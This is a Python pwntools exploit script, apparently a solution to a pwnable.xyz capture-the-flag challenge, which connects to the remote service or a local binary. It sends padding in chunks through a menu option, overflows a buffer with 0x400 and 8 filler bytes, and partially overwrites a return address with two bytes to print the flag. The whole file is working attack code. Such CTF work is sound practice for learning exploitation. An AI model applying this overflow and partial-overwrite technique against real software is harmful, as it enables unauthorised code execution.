import sys

from pwn import *

context.binary = ELF("./image/challenge/challenge")
context.log_level = "warning"


def send_bytes(io, data: bytes) -> None:
    offset = 0
    total = len(data)

    while offset < total:
        io.recvuntil(b"> ")
        io.sendline(b"2")

        prompt = io.recvuntil(b" chars: ")
        n = int(prompt.split(b"Give me ")[1].split(b" ")[0])

        if n == 0:
            io.send(b"")
            continue

        remaining = total - offset
        take = min(remaining, n)
        chunk = data[offset : offset + take]
        offset += take

        if take == n:
            payload = chunk
        else:
            pad_len = n - take - 1
            payload = chunk + b"\x00" + b"A" * pad_len

        io.send(payload)


def exploit(io) -> bytes:
    send_bytes(io, b"A" * 0x400)
    send_bytes(io, b"B" * 8)
    send_bytes(io, b"\x57\x0b")

    io.recvuntil(b"> ")
    io.sendline(b"0")
    return io.recvall(timeout=10)


def main() -> None:
    if args.REMOTE:
        io = remote("svc.pwnable.xyz", 30014)
    else:
        io = process(context.binary.path, cwd="/workspace/trabajo")

    try:
        flag = exploit(io)
        if flag:
            sys.stdout.buffer.write(flag)
        else:
            log.warning("No output received.")
    finally:
        io.close()


if __name__ == "__main__":
    main()
